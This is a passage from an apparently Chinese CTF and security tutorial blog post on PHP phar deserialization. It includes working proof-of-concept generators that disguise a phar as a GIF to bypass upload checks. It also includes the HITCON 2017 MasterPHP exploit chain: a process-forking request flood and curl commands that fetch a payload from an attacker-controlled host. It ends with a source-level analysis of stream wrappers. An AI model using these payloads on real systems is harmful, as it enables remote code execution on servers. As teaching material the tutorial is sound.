class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是当文件系统函数的参数可控时，我们可以在不调用<code>unserize()</code>的情况下，进行反序列化操作，许多的文件函数都可以触发，极大地拓展了攻击面。</p><blockquote><p>注意：</p><p>对于一个前后调用多个file函数的phar文件，只会反序列化一次。</p></blockquote><p>比如，将上述代码注释去掉，也是只有<code>file_get_contents</code>会反序列一次phar，后续的文件处理函数，都会基于之前反序列化完成的文件进行操作。(调用堆栈也可以说明这一点。)</p><p><img src="https://i.loli.net/2020/03/15/HSUOBbzWIuV8FMh.png"></p><h2 id="将phar在伪造成其他文件"><a href="#将phar在伪造成其他文件" class="headerlink" title="将phar在伪造成其他文件"></a>将phar在伪造成其他文件</h2><blockquote><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p></blockquote><p>phar2.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>并且，即使将文件名修改掉，用test.php测试发现仍然可以识别为phar，执行wakeup和destrcut。</p><p><img src="https://i.loli.net/2020/03/15/TJUuKnl4k78M5Fa.png"></p><p><img src="https://i.loli.net/2020/03/15/ADHFwBxkd9vV4QZ.png"></p><p>这样可以绕过大部分的上传waf。</p><h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>结合之前所说的，利用条件有三：</p><ol><li>phar文件可以上传到服务器</li><li>要有魔术方法作为“跳板”</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等字符没有过滤。</li></ol><h2 id="先从一个简单的例子开始"><a href="#先从一个简单的例子开始" class="headerlink" title="先从一个简单的例子开始"></a>先从一个简单的例子开始</h2><p>这里用<a href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/#i-7">Smi1e师傅</a>写的一个简单的例子：</p><p><code>upload_file.php</code>后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>upload_file.html</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Upload&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>file_un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure><p>根据<code>file_un.php</code>写一个生成phar的php文件，在文件头加上<code>GIF89a</code>绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用<code>file_exists</code>，使用<code>phar://</code>执行代码<br>构造poc.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;upload/poc.phar&#x27;</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/15/IEAJsvpCFuLO2XR.png"></p><p><img src="https://i.loli.net/2020/03/15/gdZwsJoITkxi7MU.png"></p><h2 id="当年0解的HITCON2017-Baby-H-MasterPHP"><a href="#当年0解的HITCON2017-Baby-H-MasterPHP" class="headerlink" title="当年0解的HITCON2017 Baby^H MasterPHP"></a>当年0解的HITCON2017 Baby^H MasterPHP</h2><p>用一个<code>HITCON2017</code>的一道题，当时<code>php+phar</code>第一次结合出现，而且结合匿名函数的生成机制（这一点也很难）。参赛者多数搞错了方向，所以当时是0解，<a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby^h-master-php-2017">原题链接</a></p><p>题解转载自<a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%BA%8C">mochazz</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $FLAG    = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>); </span><br><span class="line">    $SECRET  = `/read_secret`; </span><br><span class="line">    $SANDBOX = <span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);  </span><br><span class="line">    @mkdir($SANDBOX); </span><br><span class="line">    @chdir($SANDBOX); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;session-data&quot;</span>])) &#123; </span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX)); </span><br><span class="line">        $hmac = hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET); </span><br><span class="line">        setcookie(<span class="string">&quot;session-data&quot;</span>, sprintf(<span class="string">&quot;%s-----%s&quot;</span>, $data, $hmac)); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $avatar; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>)); </span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_$random() &#123;&quot;</span> </span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span> </span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>); </span><br><span class="line">            $_GET[<span class="string">&quot;lucky&quot;</span>](); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">global</span> $SECRET; </span><br><span class="line">        $data = $_COOKIE[<span class="string">&quot;session-data&quot;</span>]; </span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">&quot;-----&quot;</span>, $data, <span class="number">2</span>); </span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET), $hmac) ) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>); </span><br><span class="line"></span><br><span class="line">        $data = unserialize($data); </span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) ) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>); </span><br><span class="line">        file_put_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>, $data); </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">&quot;/avatar.gif&quot;</span>) ) </span><br><span class="line">            $path = <span class="string">&quot;/var/www/html&quot;</span>; </span><br><span class="line">        header(<span class="string">&quot;Content-Type: image/gif&quot;</span>); </span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>)); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    $mode = $_GET[<span class="string">&quot;m&quot;</span>]; </span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="string">&quot;upload&quot;</span>) </span><br><span class="line">        upload(check_session()); </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">&quot;show&quot;</span>) </span><br><span class="line">        show(check_session()); </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>题目的意思很明确，要我们利用 <strong>Admin</strong> 类的 <code>__destruct</code> 方法来获得 <strong>flag</strong> 。但是 <strong>第23行</strong> 的 <strong>$random</strong> 变量我们无法获得，这样也就无法获得 <strong>flag</strong> ，所以我们要通过匿名类的名字来调用 <strong>flag</strong> 生成函数。</p><p>我们可以看看 <strong>create_function</strong> 函数对应的内核源码。（ <strong>php-src/Zend/zend_builtin_functions.c:1901</strong> ）</p><p><img src="https://i.loli.net/2020/03/16/Ci3tUPAoe4Jjbd7.png"></p><p>可以看到匿名函数的名字类似于 <strong>\0lambda_%d</strong> ，其中 <strong>%d</strong> 为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不好控制。</p><p>这里，我们便要引入 <strong>apache-prefork</strong> 模型(默认模型)介绍（关于该模型的介绍，可以参考： <a href="http://blog.jobbole.com/91920/">Apache的三种MPM模式比较：prefork，worker，event</a> ）。当用户请求过大时，超过 <strong>apache</strong> 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。</p><p>接下来我们就来找反序列化的利用点，我们很快看到 <strong>第40行</strong> 反序列化了一个可控的 <strong>$data</strong> 变量，但是上一行有一个 <strong>hash_equals</strong> 函数进行了数据校验，而 <strong>$SECRET</strong> 的值不可知，这就没法利用这一反序列化点。</p><p>接着我们会看到 <strong>第46行</strong> 有一个上传 <strong>gif</strong> 文件功能，且 <strong>$data</strong> 变量可控。那么攻击思路就是，我们先通过将构造好的 <strong>phar</strong> 文件传到服务器上，再利用可控的 <strong>$_GET[“url”]</strong> 结合 <strong>phar</strong> 协议，进行反序列化。用于生成 <strong>phar</strong> 的代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// phar.readonly无法通过该语句进行设置: init_set(&quot;phar.readonly&quot;,0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $avatar; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = <span class="string">&#x27;avatar.gif&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> Admin();</span><br><span class="line">$filename = <span class="string">&#x27;avatar.phar&#x27;</span>;</span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="literal">null</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;foo.txt&quot;</span>,<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的 <strong>avatar.phar</strong> 放在自己的 <strong>VPS</strong> 上并重命名成 <strong>avatar.gif</strong> ，然后将文件上传到题目服务器上：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;VPS_IP&#x2F;</span><br></pre></td></tr></table></figure><p>接着，我们需要通过大量请求，使 <strong>apache</strong> 重新开启一个新的线程，然后访问如下 <strong>url</strong> 即可完成反序列化并获得 <strong>flag</strong> ：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;data&#x2F;xxxx&#x2F;&amp;lucky&#x3D;%00lambda_1</span><br></pre></td></tr></table></figure><p>这里我们使用orange的<code>fork.py</code>生成大量请求：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">        PORT = <span class="number">8000</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">&#x27;GET /avatar.gif HTTP/1.1\nHost: localhost\nConnection: Keep-Alive\n\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><strong>下面给出 Orange 的解题过程</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get a cookie</span></span><br><span class="line">$ curl http://host/ --cookie-jar cookie</span><br><span class="line"></span><br><span class="line"><span class="comment"># download .phar file from http://orange.tw/avatar.gif</span></span><br><span class="line">$ curl -b cookie <span class="string">&#x27;http://host/?m=upload&amp;url=http://orange.tw/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># force apache to fork new process</span></span><br><span class="line">$ python fork.py &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line">$ curl -b cookie <span class="string">&quot;http://host/?m=upload&amp;url=phar:///var/www/data/<span class="variable">$MD5_IP</span>/&amp;lucky=%00lambda_1&quot;</span></span><br></pre></td></tr></table></figure><h1 id="从源码角度来看phar反序列化的问题"><a href="#从源码角度来看phar反序列化的问题" class="headerlink" title="从源码角度来看phar反序列化的问题"></a>从源码角度来看phar反序列化的问题</h1><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实，在看到前文那么多文件操作函数都受到<code>phar</code>反序列化的影响，我们会自然的思考：为什么？</p><ol><li>很多的函数都受影响</li><li>还有部分文件操作函数未受影响（如basename,fputs等）</li></ol><p>zsx大佬在文章——<a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 回答了我们的疑问：因为受影响的函数都使用了同样的一个接口，而未受影响的函数是因为未使用该接口。这个接口就是——<code>wrapper</code> 。</p><h2 id="流封装协议（wrapper）"><a href="#流封装协议（wrapper）" class="headerlink" title="流封装协议（wrapper）"></a>流封装协议（wrapper）</h2><p><code>wrapper</code>就是指封装的php协议。因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件</p><p>虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。</p><p>每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：<code>://</code>，其中 <code> 是流的封装协议，</code> 是流的数据源。</p><p>使用 <strong>stream_get_wrappers()</strong> 获取当前系统注册的全部 wrapper</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\DELL&gt;php -r <span class="string">&quot;var_dump(stream_get_wrappers());&quot;</span></span><br><span class="line">Command line code:1:</span><br><span class="line">array(10) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;php&quot;</span></span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;file&quot;</span></span><br><span class="line">  [2] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;glob&quot;</span></span><br><span class="line">  [3] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;data&quot;</span></span><br><span class="line">  [4] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [5] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;ftp&quot;</span></span><br><span class="line">  [6] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;zip&quot;</span></span><br><span class="line">  [7] =&gt;</span><br><span class="line">  string(13) <span class="string">&quot;compress.zlib&quot;</span></span><br><span class="line">  [8] =&gt;</span><br><span class="line">  string(14) <span class="string">&quot;compress.bzip2&quot;</span></span><br><span class="line">  [9] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;phar&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="试着找问题的源头"><a href="#试着找问题的源头" class="headerlink" title="试着找问题的源头"></a>试着找问题的源头</h2><p>我们需要先找到其原理，然后往下深入挖掘。<br>先看<code>file_get_contents</code>的代码。其调用了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stream = php_stream_open_wrapper_ex(filename, <span class="string">&quot;rb&quot;</span> ....);</span><br></pre></td></tr></table></figure><p>这么个函数。</p><p>再看<code>unlink</code>的代码，其调用了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wrapper = php_stream_locate_url_wrapper(filename, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这么个函数。</p><p>从<code>php_stream_open_wrapper_ex</code>的<a href="https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/streams/streams.c#L2010">实现</a>，可以看到，其也调用了<code>php_stream_locate_url_wrapper</code> 。这个函数的作用是通过url来找到对应的wrapper。我们可以看到，phar组件注册了<code>phar://</code>这个wrapper， <a href="https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c">https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c</a><br>其定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> php_stream_wrapper_ops phar_stream_wops = &#123;</span><br><span class="line">    phar_wrapper_open_url,</span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_close */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_stat, */</span></span><br><span class="line">    phar_wrapper_stat,     <span class="comment">/* stat_url */</span></span><br><span class="line">    phar_wrapper_open_dir, <span class="comment">/* opendir */</span></span><br><span class="line">    <span class="string">&quot;phar&quot;</span>,</span><br><span class="line">    phar_wrapper_unlink,   <span class="comment">/* unlink */</span></span><br><span class="line">    phar_wrapper_rename,   <span class="comment">/* rename */</span></span><br><span class="line">    phar_wrapper_mkdir,    <span class="comment">/* create directory */</span></span><br><span class="line">    phar_wrapper_rmdir,    <span class="comment">/* remove directory */</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着，让我们翻这几个函数的实现，会发现它们都调用了<code>phar_parse_url</code>，这个函数再调用<code>phar_open_or_create_filename</code> -&gt; <code>phar_create_or_parse_filename</code> -&gt; <code>phar_open_from_fp</code> -&gt; <code>phar_parse_pharfile</code> -&gt; <code>phar_parse_metadata</code> -&gt; <code>phar_var_unserialize</code>。因此，明面上来看，所有文件函数，均可以触发此phar漏洞，因为它们都直接或间接地调用了这个wrapper。</p><h2 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h2><p>这是一个所有的和IO有关的函数，都可能触发的问题。操作文件的<code>touch</code>，也是能触发它的。而且我们会发现除了之前所说的文件操作函数，还有很多调用<code>wrapper</code>都可以触发：</p><h3 id="exif"><a href="#exif" class="headerlink" title="exif"></a>exif</h3><ul><li><code>exif_thumbnail</code></li><li><code>exif_imagetype</code></li></ul><h3 id="gd"><a href="#gd" class="headerlink" title="gd"></a>gd</h3><ul><li><code>imageloadfont</code></li><li><code>imagecreatefrom***</code></li></ul><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><ul><li><code>hash_hmac_file</code></li><li><code>hash_file</code></li><li><code>hash_update_file</code></li><li><code>md5_file</code></li><li><code>sha1_file</code></li></ul><h3 id="file-url"><a href="#file-url" class="headerlink" title="file / url"></a>file / url</h3><ul><li><code>get_meta_tags</code></li><li><code>get_headers</code></li><li><code>touch</code></li></ul><h3 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h3><ul><li><code>getimagesize</code></li><li><code>getimagesizefromstring</code></li></ul><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Bzip-Gzip"><a href="#Bzip-Gzip" class="headerlink" title="Bzip / Gzip"></a>Bzip / Gzip</h3><p>如果题目限制了，<code>phar://</code>不能出现在头几个字符怎么办？</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$z &#x3D; 